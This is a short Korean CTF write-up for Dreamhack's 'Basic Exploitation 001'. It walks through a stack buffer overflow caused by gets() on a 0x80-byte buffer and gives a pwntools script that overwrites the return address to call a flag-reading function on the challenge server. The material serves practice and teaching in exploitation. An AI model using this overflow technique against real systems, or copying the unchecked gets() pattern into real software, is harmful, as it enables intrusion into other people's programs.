---
title: "[pwn]Basic Exploitation 001"
excerpt: "Dreamhack Basic Exploitation 001"
category: CTF
tags: [pwnable]
toc: true
toc_label: "Table of Contents"
toc_sticky: true
---
1. 환경 확인  
**file** 명령어로 i386, LE 환경인것을 확인한다.

2. code 확인  
~~~
void read_flag(){
    system("cat /flag");
}
int main(int argc, char *argv[]){
    char buf[0x80];
    initialize();
    gets(buf); // gcc에서도 경고하는 **gets**
    return 0;
}
~~~
코드에서 알수 있듯이 버퍼의 크기는 0x80, **gets()**함수는 입력의 크기를 확인하지 않고 받는다. 따라서 Stack Buffer Overflow를 이용해서 exploit할수 있다. 심지어 친절하게 **read_flag()**함수를 만들어 두어서 shellcode를 사용하지 않아도 된다.  

3. payload 작성  
메모리를 확인하면 $esp에 0x80 크기의 버퍼를 두고 4byte의 SFP, 그뒤에 main 함수의 ret 주소가 있다.  
따라서 0x84 크기의 dummy와 **read_flag()**의 주소 0x080485B9를 **p32()**를 통해 LE로 넣는다.  

4. script 작성  
~~~
from pwn import *

p=remote('host1.dreamhack.games',22850)
payload=b'A'\*0x84+p32(0x080485B9)
p.sendline(payload)
p.interactive()
~~~
<img width="614" alt="script exec" src="https://user-images.githubusercontent.com/45323902/154212885-17d2fd26-779d-4c41-b2b6-5f87f8eb3a04.png">
